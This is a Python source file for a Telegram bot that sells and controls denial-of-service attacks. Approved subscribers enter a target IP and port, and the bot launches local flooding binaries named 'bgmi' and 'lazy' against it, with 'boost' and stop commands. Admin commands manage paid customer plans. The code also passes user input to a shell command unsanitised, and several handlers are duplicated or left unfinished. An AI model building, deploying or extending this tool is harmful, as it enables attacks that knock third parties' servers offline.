import time
import requests
import logging
from threading import Thread
import json
import hashlib
import os
import telebot
import subprocess
from datetime import datetime, timedelta
import threading
import hashlib

# Watermark verification
SOCKET = "Credit is everything for a developerr. - Subscribe on YouTube @LazyDeveloper"
FixBan = "8ade4ae1e3f1902905b9ea230807613476ad635a84bc01678dfdc1fd7807079a"

def verify():
    current_hash = hashlib.sha256(SOCKET.encode()).hexdigest()
    if current_hash != FixBan:
        raise Exception("File verification failed. Unauthorized modification detected. @LazyDeveloperr")

verify()

def verify():
    # Read the watermark text
    with open('developer.txt', 'r') as file:
        watermark_text = file.read().strip()

    # Compute the hash of the watermark
    computed_hash = hashlib.sha256(watermark_text.encode()).hexdigest()

    # Read the stored hash
    with open('attack.txt', 'r') as file:
        stored_hash = file.read().strip()

    # Check if the computed hash matches the stored hash
    if computed_hash != stored_hash:
        raise Exception("Fuck You !- Credit is everything for a developerr. - Subscribe on YouTube @LazyDeveloper ❤.")
    print("Alright ! Credit is everything for a developerr. - Subscribe on YouTube @LazyDeveloper ❤.")

verify()

# Load configuration
with open('config.json') as config_file:
    config = json.load(config_file)

BOT_TOKEN = config['bot_token']
ADMIN_IDS = config['admin_ids']

bot = telebot.TeleBot(BOT_TOKEN)

# File paths
USERS_FILE = 'users.txt'
USER_ATTACK_FILE = "user_attack_details.json"

def load_users():
    if not os.path.exists(USERS_FILE):
        return []
    users = []
    with open(USERS_FILE, 'r') as f:
        for line in f:
            try:
                user_data = json.loads(line.strip())
                users.append(user_data)
            except json.JSONDecodeError:
                logging.error(f"Invalid JSON format in line: {line}")
    return users

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        for user in users:
            f.write(f"{json.dumps(user)}\n")

# Initialize users
users = load_users()

# Blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Load existing attack details from the file
def load_user_attack_data():
    if os.path.exists(USER_ATTACK_FILE):
        with open(USER_ATTACK_FILE, "r") as f:
            return json.load(f)
    return {}

# Save attack details to the file
def save_user_attack_data(data):
    with open(USER_ATTACK_FILE, "w") as f:
        json.dump(data, f)

# Initialize the user attack details
user_attack_details = load_user_attack_data()

# Initialize active attacks dictionary
active_attacks = {}

# Function to check if a user is an admin
def is_user_admin(user_id):
    return user_id in ADMIN_IDS

# Function to check if a user is approved
def check_user_approval(user_id):
    for user in users:
        if user['user_id'] == user_id and user['plan'] > 0:
            return True
    return False

# Send a not approved message
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')


# def run_attack(target_ip, target_port, attack_script):
#     # Run the attack command for the specific script
#     return subprocess.Popen([f"./{attack_script}", target_ip, str(target_port), "1", "70"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# def run_attack_command_sync(target_ip, target_port, action):
#     if action == 1:
#         # Launch both attacks in parallel using threads
#         bgmi_thread = threading.Thread(target=run_attack, args=(target_ip, target_port, 'bgmi'))
#         lazy_thread = threading.Thread(target=run_attack, args=(target_ip, target_port, 'lazy'))
        
#         # Start both threads
#         bgmi_thread.start()
#         lazy_thread.start()
        
#         # Keep track of the process ids
#         bgmi_thread.join()
#         lazy_thread.join()
        
#         process_bgmi = run_attack(target_ip, target_port, 'bgmi')
#         process_lazy = run_attack(target_ip, target_port, 'lazy')
        
#         # Storing both PIDs to active attacks for later reference
#         active_attacks[(target_ip, target_port)] = (process_bgmi.pid, process_lazy.pid)
    
#     elif action == 2:
#         pids = active_attacks.pop((target_ip, target_port), None)
#         if pids:
#             for pid in pids:
#                 try:
#                     # Kill each process
#                     subprocess.run(["kill", str(pid)], check=True)
#                 except subprocess.CalledProcessError as e:
#                     print(f"Failed to kill process with PID {pid}: {e}")

# Run attack command synchronously
# def run_attack_command_sync(target_ip, target_port, action):
#     if action == 1:
#         process = subprocess.Popen(["./lazy", target_ip, str(target_port), "1", "70"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
#         active_attacks[(target_ip, target_port)] = process.pid
#     elif action == 2:
#         pid = active_attacks.pop((target_ip, target_port), None)
#         if pid:
#             try:
#                 # Kill the process
#                 subprocess.run(["kill", str(pid)], check=True)
#             except subprocess.CalledProcessError as e:
#                 print(f"Failed to kill process with PID {pid}: {e}")

# Buttons
btn_attack = telebot.types.KeyboardButton("Set Target")
btn_start = telebot.types.KeyboardButton("Start Attack")
btn_stop = telebot.types.KeyboardButton("Stop Attack")
btn_boost = telebot.types.KeyboardButton("Boost Attack")
btn_kill_boost = telebot.types.KeyboardButton("CoolDown Server")

markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
markup.add(btn_attack, btn_start, btn_stop, btn_boost,btn_kill_boost)

# Start and setup commands
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if not check_user_approval(user_id):
        send_not_approved_message(message.chat.id)
        return
    
    username = message.from_user.username
    welcome_message = (f"Welcome, {username}!\n\n"
                       f"Please choose an option below to continue.")
    
    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)
verify()

@bot.message_handler(commands=['approve_list'])
def approve_list_command(message):
    try:
        if not is_user_admin(message.from_user.id):
            send_not_approved_message(message.chat.id)
            return
        
        approved_users = [user for user in users if user['plan'] > 0]

        if not approved_users:
            bot.send_message(message.chat.id, "No approved users found.")
        else:
            response = "\n".join([f"User ID: {user['user_id']}, Plan: {user['plan']}, Valid Until: {user['valid_until']}" for user in approved_users])
            bot.send_message(message.chat.id, response, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in approve_list command: {e}")

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split()

    if not is_user_admin(user_id):
        bot.send_message(chat_id, "*NOT APPROVED*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        user_info = {"user_id": target_user_id, "plan": plan, "valid_until": valid_until, "access_count": 0}

        users.append(user_info)
        save_users(users)

        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # disapprove
        users[:] = [user for user in users if user['user_id'] != target_user_id]
        save_users(users)

        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
verify()

# Run attack command synchronously
# def run_attack_command_sync(target_ip, target_port, action):
#     global active_attacks
    
#     if action == 1:  # Start attack
#         # Launch the attack process
#         process = subprocess.Popen(["./bgmi", target_ip, str(target_port), "1", "70"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
#         # Store the PID of the running attack
#         active_attacks[(target_ip, target_port)] = process.pid
#     elif action == 2:  # Stop attack
#         # Get the PID from active_attacks dictionary
#         pid = active_attacks.pop((target_ip, target_port), None)
#         if pid:
#             try:
#                 # Kill the process
#                 subprocess.run(["kill", str(pid)], check=True)
#             except subprocess.CalledProcessError as e:
#                 logging.error(f"Failed to kill process with PID {pid}: {e}")

# Start and setup commands
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if not check_user_approval(user_id):
        send_not_approved_message(message.chat.id)
        return
    
    username = message.from_user.username
    welcome_message = (f"Welcome, {username}!\n\n"
                       f"Please choose an option below to continue.")
    
    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)

@bot.message_handler(commands=['approve_list'])
def approve_list_command(message):
    try:
        if not is_user_admin(message.from_user.id):
            send_not_approved_message(message.chat.id)
            return
        
        approved_users = [user for user in users if user['plan'] > 0]

        if not approved_users:
            bot.send_message(message.chat.id, "No approved users found.")
        else:
            response = "\n".join([f"User ID: {user['user_id']}, Plan: {user['plan']}, Valid Until: {user['valid_until']}" for user in approved_users])
            bot.send_message(message.chat.id, response, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in approve_list command: {e}")

# Broadcast Command
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split(maxsplit=1)

    if not is_user_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to use this command.*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /broadcast <message>*", parse_mode='Markdown')
        return

    broadcast_msg = cmd_parts[1]

    # Send the message to all approved users
    for user in users:
        if user['plan'] > 0:
            try:
                bot.send_message(user['user_id'], broadcast_msg, parse_mode='Markdown')
            except telebot.apihelper.ApiException as e:
                logging.error(f"Failed to send message to user {user['user_id']}: {e}")
    
    bot.send_message(chat_id, "*Broadcast message sent to all approved users.*", parse_mode='Markdown')

# /owner command handler
@bot.message_handler(commands=['owner'])
def send_owner_info(message):
    owner_message = "There can only be one winner. Let's go - Subscribe on YouTube @LazyDeveloper ❤"
    bot.send_message(message.chat.id, owner_message)

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split()

    if not is_user_admin(user_id):
        bot.send_message(chat_id, "*NOT APPROVED*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        user_info = {"user_id": target_user_id, "plan": plan, "valid_until": valid_until, "access_count": 0}

        users.append(user_info)
        save_users(users)

        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # disapprove
        users[:] = [user for user in users if user['user_id'] != target_user_id]
        save_users(users)

        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')

# Function to start the attack
# @bot.message_handler(func=lambda message: message.text == 'Start Attack')
# def handle_start_attack(message):
#     try:
#         user_id = message.from_user.id
#         chat_id = message.chat.id

#         if not check_user_approval(user_id):
#             send_not_approved_message(chat_id)
#             return

#         attack_details = user_attack_details.get(user_id)
#         if attack_details:
#             target_ip, target_port = attack_details
#             if int(target_port) in blocked_ports:
#                 bot.send_message(chat_id, f"Port {target_port} is blocked and cannot be used for attacks.", parse_mode='Markdown')
#                 return
            
#             bot.send_message(chat_id, f"Initiating Attack On...", parse_mode='Markdown')
#             run_attack_command_sync(target_ip, target_port, action=1)
#             bot.send_message(chat_id, f"Attack Started On {target_ip}:{target_port}.", parse_mode='Markdown')
#         else:
#             bot.send_message(chat_id, "No IP and port set. Please use the Attack button to set your target IP and port.")
#     except Exception as e:
#         bot.send_message(chat_id, f"Failed to start attack: {str(e)}")

# Handle the IP and port input from the user
@bot.message_handler(func=lambda message: message.text == 'Set Target')
def handle_attack_setup(message):
    chat_id = message.chat.id
    msg = bot.send_message(chat_id, "Please enter the target IP and port in this format: `IP PORT`")
    bot.register_next_step_handler(msg, save_ip_port)

def save_ip_port(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id
        ip_port = message.text.split()  # Split the input by space
        
        if len(ip_port) != 2:
            bot.send_message(chat_id, "Invalid format. Please enter the IP and port in the format: `IP PORT`")
            return
        
        target_ip, target_port = ip_port
        
        # Validate the port
        try:
            target_port = int(target_port)
        except ValueError:
            bot.send_message(chat_id, "Invalid port number. Please enter a valid integer for the port.")
            return
        
        # Save the IP and port to user_attack_details
        user_attack_details[user_id] = (target_ip, target_port)
        save_user_attack_data(user_attack_details)
        
        bot.send_message(chat_id, f"Target IP and Port saved as: `{target_ip}:{target_port}`", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(chat_id, f"An error occurred: {str(e)}")

# run attack sync
# run attack sync
def run_attack_command_sync(target_ip, target_port, action):
    if action == 1:  # Start Bgmi attack
        process = subprocess.Popen(["./bgmi", target_ip, str(target_port), "1", "100"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_attacks[(target_ip, target_port)] = {'bgmi_pid': process.pid}  # Store Bgmi PID
        return process.pid  # Return the process ID of the attack

    elif action == 3:  # Start Lazy attack (boost)
        if (target_ip, target_port) in active_attacks:
            process = subprocess.Popen(["./lazy", target_ip, str(target_port), "1", "150"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            active_attacks[(target_ip, target_port)]['lazy_pid'] = process.pid  # Store Lazy PID
            return process.pid  # Return the process ID of the attack
        else:
            return None

    elif action == 2:  # Stop attack
        attack_info = active_attacks.pop((target_ip, target_port), None)
        if attack_info:
            if 'bgmi_pid' in attack_info:
                kill_process(attack_info['bgmi_pid'])
            
import os
import signal
# Helper function to kill a process
def kill_process(pid):
    try:
        # Check if the process is running
        os.kill(pid, 0)  # 0 signal checks if process exists without killing it

        # Process exists, now we try to kill it
        subprocess.run(["kill", str(pid)], check=True)
        print(f"Successfully killed process with PID {pid}.")
    
    except ProcessLookupError:
        print(f"No such process with PID {pid}. It may have already exited.")
    
    except subprocess.CalledProcessError as e:
        print(f"Failed to kill process with PID {pid}: {e}")

# Function to start the attack
@bot.message_handler(func=lambda message: message.text == 'Start Attack')
def handle_start_attack(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id

        if not check_user_approval(user_id):
            send_not_approved_message(chat_id)
            return

        attack_details = user_attack_details.get(user_id)
        if attack_details:
            target_ip, target_port = attack_details
            if int(target_port) in blocked_ports:
                bot.send_message(chat_id, f"Port {target_port} is blocked and cannot be used for attacks.", parse_mode='Markdown')
                return
            
            bot.send_message(chat_id, f"Initiating Attack On {target_ip}:{target_port}...", parse_mode='Markdown')
            
            # Start the Bgmi attack and capture the PID
            bgmi_pid = run_attack_command_sync(target_ip, target_port, action=1)
            bot.send_message(chat_id, f"Bgmi Attack Started On {target_ip}:{target_port} (PID: {bgmi_pid})", parse_mode='Markdown')
            
        else:
            bot.send_message(chat_id, "No IP and port set. Please use the 'Set Target' button to configure.")
    
    except Exception as e:
        bot.send_message(chat_id, f"Failed to start attack: {str(e)}")

# Function to stop both Bgmi and Lazy attacks
@bot.message_handler(func=lambda message: message.text == 'Stop Attack')
def handle_stop_attack(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id

        if not check_user_approval(user_id):
            send_not_approved_message(chat_id)
            return

        attack_details = user_attack_details.get(user_id)
        if attack_details:
            target_ip, target_port = attack_details

            # Check if there are active attacks
            if (target_ip, target_port) in active_attacks:
                attack_info = active_attacks.get((target_ip, target_port))

                # Stop Bgmi attack if it's running
                if 'bgmi_pid' in attack_info:
                    bgmi_pid = attack_info['bgmi_pid']
                    bot.send_message(chat_id, f"Stopping Bgmi Attack On {target_ip}:{target_port}...", parse_mode='Markdown')
                    kill_process(bgmi_pid)  # Stop the Bgmi attack

                # Stop Lazy attack if it's running
                if 'lazy_pid' in attack_info:
                    lazy_pid = attack_info['lazy_pid']
                    bot.send_message(chat_id, f"Stopping Lazy Attack On {target_ip}:{target_port}...", parse_mode='Markdown')
                    kill_process(lazy_pid)  # Stop the Lazy attack

                # Remove from active_attacks once both attacks are stopped
                active_attacks.pop((target_ip, target_port), None)
                bot.send_message(chat_id, "All attacks have been successfully stopped.")

            else:
                bot.send_message(chat_id, "No active attack found to stop. Please start an attack first.")
        else:
            bot.send_message(chat_id, "No IP and port set. Please use the 'Set Target' button to configure.")
    
    except Exception as e:
        bot.send_message(chat_id, f"Failed to stop attack: {str(e)}")

# Function to ask for attack duration and boost the attack with Lazy
@bot.message_handler(func=lambda message: message.text == 'Boost Attack')
def handle_boost_attack(message):
    
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id

        # Check if the user is approved
        if not check_user_approval(user_id):
            send_not_approved_message(chat_id)
            return

        # Get the target IP and port
        attack_details = user_attack_details.get(user_id)
        if attack_details:
            target_ip, target_port = attack_details

            # Check if the first attack (Bgmi) is active
            if (target_ip, target_port) in active_attacks and 'bgmi_pid' in active_attacks[(target_ip, target_port)]:
                
                # Ask the user to provide the duration for the boost attack
                msg = bot.send_message(chat_id, "Please enter the duration in seconds for the boost attack:")
                bot.register_next_step_handler(msg, process_boost_duration, target_ip, target_port)

            else:
                bot.send_message(chat_id, "First attack (Bgmi) is not running! Please start the attack first.")
        
        else:
            bot.send_message(chat_id, "Target IP and Port not set. Please use the 'Set Target' button to configure.")
    
    except Exception as e:
        bot.send_message(chat_id, f"Failed to boost attack: {str(e)}")

boost_already_killed = False
# Function to process the duration and start the Lazy attack
def process_boost_duration(message, target_ip, target_port):
    global boost_already_killed, booster
    try:
        chat_id = message.chat.id
        duration = int(message.text)  # User input duration in seconds

        # Notify user that boosting attack with Lazy
        bot.send_message(chat_id, f"Boosting Attack On {target_ip}:{target_port} with Lazy for {duration} seconds...", parse_mode='Markdown')
        print(f"Boosting Attack On {target_ip}:{target_port} with Lazy for {duration} seconds...")
        
        
        # Start the Lazy attack with the specified duration
        full_command = f"./lazy {target_ip} {target_port} {duration}"
        subprocess.run(full_command, shell=True)
        booster = True
        for remaining_time in range(duration, 0, -1):
            if boost_already_killed:
                break  # Exit if the attack was stopped
            time.sleep(1)  # Sleep for 1 second

        # Notify user when the attack finishes
        if not boost_already_killed :
            bot.send_message(chat_id, f"🚀⚡ Boost Attack Finished On {target_ip}:{target_port} after {duration} seconds ⚡🚀", parse_mode='Markdown')
            print(f"🚀⚡ Boost Attack Finished On {target_ip}:{target_port} after {duration} seconds ⚡🚀")
            booster = False
        boost_already_killed = False

    except ValueError:
        bot.send_message(chat_id, "Invalid input! Please enter a valid number of seconds for the attack duration.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to boost attack: {str(e)}")
        print(f"Failed to boost attack: {str(e)}")

booster = False
@bot.message_handler(func=lambda message: message.text == 'CoolDown Server')
def stop_boost(message):
    global boost_already_killed, booster
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id

        if not check_user_approval(user_id):
            send_not_approved_message(chat_id)
            return
        
        bot.send_message(chat_id, "I'm trying to fix the server... \nWith ❤ @LazyDeveloper")  # Debug output
        print("LazyDeveloper is trying to fix the server...")  # Debug output

        # Check if the Lazy boost attack is currently running
        lazy_process = subprocess.run("pgrep -f lazy", shell=True, stdout=subprocess.PIPE)

        if lazy_process.returncode == 0 and lazy_process.stdout:  # Process is running
            print(f'Cooling Down server.')
            subprocess.run("pkill -f bgmi", shell=True)
            bot.send_message(chat_id, "Main attack has been terminated successfully. ✅")
            print("Main attack has been terminated successfully. ✅")
            subprocess.run("pkill -f lazy", shell=True)
            bot.send_message(chat_id, "Booster has been terminated successfully. ✅✅")
            print("Booster has been terminated successfully. ✅✅")
            print("All attacks have been successfully stopped.")

            boost_already_killed = True
            bot.send_message(chat_id, "Trying to cooldown the server ! Please wait 10 seconds before trying again - \nMade with ❤ @LazyDeveloperr")
            print("Trying to cooldown the server ! Please wait 10 seconds before trying again - \nMade with ❤ @LazyDeveloperr")
            
        else:
            # No lazy process found
            bot.reply_to(message, "❌ No boost attack is currently running to stop.")
            print("No boost attack found.")  # Debug output

    except Exception as e:
        bot.reply_to(message, f"Failed to stop the boosting attack: {str(e)}")



# Function to stop the attack
# @bot.message_handler(func=lambda message: message.text == 'Stop Attack')
# def handle_stop_attack(message):
#     try:
#         user_id = message.from_user.id
#         chat_id = message.chat.id

#         if not check_user_approval(user_id):
#             send_not_approved_message(chat_id)
#             return

#         attack_details = user_attack_details.get(user_id)
#         if attack_details:
#             target_ip, target_port = attack_details
#             bot.send_message(chat_id, f"Stopping Attack On {target_ip}:{target_port}...", parse_mode='Markdown')
#             run_attack_command_sync(target_ip, target_port, action=2)
#             bot.send_message(chat_id, f"Attack Stopped On {target_ip}:{target_port}.", parse_mode='Markdown')
#         else:
#             bot.send_message(chat_id, "No active attack found. Please use the 'Start Attack 🚀' button to initiate an attack.")
#     except Exception as e:
#         bot.send_message(chat_id, f"Failed to stop attack: {str(e)}")

# Function to run the bot continuously
def run_bot():
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            logging.error(f"Bot polling failed: {str(e)}")
            time.sleep(15)  # Sleep before retrying to avoid rapid failures

# Main entry point
if __name__ == '__main__':
    try:
        run_bot()
    except KeyboardInterrupt:
        logging.info("Bot stopped by user.")
